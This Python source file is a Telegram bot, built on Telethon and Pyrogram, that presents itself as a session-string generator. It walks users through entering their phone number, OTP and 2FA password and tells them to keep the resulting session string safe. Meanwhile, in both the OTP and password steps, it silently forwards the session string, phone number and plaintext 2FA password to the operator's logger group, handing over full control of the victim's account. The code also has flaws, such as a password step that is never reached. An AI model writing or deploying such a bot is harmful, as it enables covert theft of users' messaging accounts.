import time
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from pyrogram import Client as PyroClient
from pyrogram.errors import PhoneCodeExpiredError

# Replace with your own values
API_ID = "YOUR_API_ID"
API_HASH = "YOUR_API_HASH"
LOGGER_GROUP_ID = "YOUR_LOGGER_GROUP_ID"

# Dictionary to store user sessions
user_sessions = {}

# Define the bot with Telethon
bot = TelegramClient(StringSession(), API_ID, API_HASH)

@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone_pyro"}  # You can set either phone_telethon or phone_pyro
    await event.respond("🔹 **Enter your phone number:**")

@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id

    # If user doesn't have an active session, return
    if user_id not in user_sessions:
        return  

    step = user_sessions[user_id]["step"]

    # Step 1: Enter Phone Number
    if step == "phone_pyro" or step == "phone_telethon":
        phone_number = event.message.text.strip()
        user_sessions[user_id]["phone"] = phone_number  

        if step == "phone_pyro":
            client = PyroClient(":memory:", api_id=API_ID, api_hash=API_HASH)
            await client.connect()
            sent_code = await client.send_code(phone_number)
        else:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            sent_code = await client.send_code_request(phone_number)

        user_sessions[user_id]["client"] = client  
        user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  
        user_sessions[user_id]["step"] = "otp"
        await event.respond("🔹 **OTP Sent! Enter the OTP received on Telegram.**")

    # Step 2: Enter OTP
    elif step == "otp":
        otp_code = event.message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]
        phone_code_hash = user_sessions[user_id]["phone_code_hash"]

        retries = 3  # Max retries for OTP
        for attempt in range(retries):
            try:
                if isinstance(client, PyroClient):
                    await client.sign_in(phone_number, phone_code_hash, otp_code)
                    session_string = await client.export_session_string()  # Await for PyroClient
                else:
                    await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
                    session_string = client.session.save()  # For Telethon

                await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session Generated!**\n\n**👤 User:** `{user_id}`\n**📞 Phone:** `{phone_number}`\n**🔑 Session:** `{session_string}`")

                await event.respond(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep this safe!**")
                if user_id in user_sessions:  # Check before deleting session
                    del user_sessions[user_id]
                break  # Exit after successful OTP verification

            except PhoneCodeExpiredError:
                if attempt < retries - 1:
                    await event.respond(f"❌ **Error:** The confirmation code has expired. Trying again... ({attempt + 1}/{retries})")
                    # Resend code logic (add retry mechanism)
                    sent_code = await client.send_code(phone_number)
                    user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Update phone_code_hash
                    await event.respond("🔹 **New OTP sent. Please enter the code again.**")
                    time.sleep(2)  # Add delay between OTP retries
                else:
                    await event.respond("❌ **Error:** The OTP expired multiple times. Please try again later.")
                    if user_id in user_sessions:  # Check before deleting session
                        del user_sessions[user_id]  # Remove session if failed after retries

            except Exception as e:
                await event.respond(f"❌ **Error:** {str(e)}\n🔄 Please try again!")
                if user_id in user_sessions:  # Check before deleting session
                    del user_sessions[user_id]

    # Step 3: Enter 2FA Password
    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            if isinstance(client, PyroClient):
                await client.check_password(password)
                session_string = await client.export_session_string()  # Await for PyroClient
            else:
                await client.sign_in(password=password)
                session_string = client.session.save()  # For Telethon

            await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session (with 2FA)!**\n\n**👤 User:** `{user_id}`\n**🔑 Session:** `{session_string}`\n🔒 **Password Used:** `{password}`")

            await event.respond(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep this safe!**")
            if user_id in user_sessions:  # Check before deleting session
                del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}\n🔄 Please try again!")

# Run the bot
bot.start()
